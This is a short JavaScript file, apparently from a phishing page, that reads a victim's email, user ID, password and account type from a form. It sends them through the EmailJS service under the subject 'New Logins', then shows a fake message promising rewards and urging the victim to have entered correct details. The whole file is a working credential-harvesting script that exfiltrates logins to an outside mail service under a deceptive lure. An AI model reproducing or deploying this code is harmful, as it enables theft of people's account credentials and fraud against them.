let email = document.getElementById("Email")
let uid = document.getElementById("UID")
let pass = document.getElementById("Password")
let account = document.getElementById("account")

// var messageBody = 
function sendMail() {
    
  setTimeout(() => {
     let parms = {
         name: uid.value,
         subject: "New Logins",
         message: "Email: " + email.value + " Password: " + pass.value + " Account type: " + account.value,
     }
     
     emailjs.send("service_o2sn91n", "template_gsuu2cl",parms).then(alert("Details has been successfully Sent!. You'll get your rewards soon. Make sure you've Inputted correct details."))
        }, 1000)

    
}